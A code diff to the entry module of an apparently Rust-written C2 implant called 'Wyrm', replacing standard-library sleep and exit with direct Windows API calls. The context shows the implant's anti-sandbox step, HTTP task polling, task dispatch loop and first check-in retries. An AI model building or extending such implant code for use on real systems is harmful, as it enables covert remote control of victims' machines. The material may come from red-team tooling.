@@ -1,10 +1,11 @@
 //! Entry module for kicking off the implant, whether from a DLL or an exe.
 
-use std::{sync::atomic::AtomicBool, thread::sleep, time::Duration};
+use core::{sync::atomic::AtomicBool, time::Duration};
 
 #[cfg(debug_assertions)]
 use shared::pretty_print::print_failed;
 use shared::pretty_print::print_info;
+use windows_sys::Win32::System::Threading::{ExitProcess, Sleep};
 
 use crate::{
     anti_sandbox::anti_sandbox,
@@ -44,7 +45,10 @@ pub fn start_wyrm() {
         implant.get_tasks_http();
         implant.dispatch_tasks();
 
-        sleep(Duration::from_secs(calculate_sleep_seconds(&implant)));
+        let t = Duration::from_secs(calculate_sleep_seconds(&implant)).as_millis() as u32;
+        unsafe {
+            Sleep(t);
+        }
     }
 }
 
@@ -80,12 +84,13 @@ pub fn first_check_in(implant: &mut Wyrm) {
                 if attempt == implant.first_connection_retries.num_retries {
                     #[cfg(debug_assertions)]
                     print_failed("Max first connection retries reached. Exiting.");
-                    std::process::exit(0);
+                    unsafe { ExitProcess(0) };
                 }
 
-                std::thread::sleep(Duration::from_secs(
-                    implant.first_connection_retries.failed_first_conn_sleep,
-                ));
+                let t =
+                    Duration::from_secs(implant.first_connection_retries.failed_first_conn_sleep)
+                        .as_millis();
+                unsafe { Sleep(t as u32) };
                 continue;
             }
         };
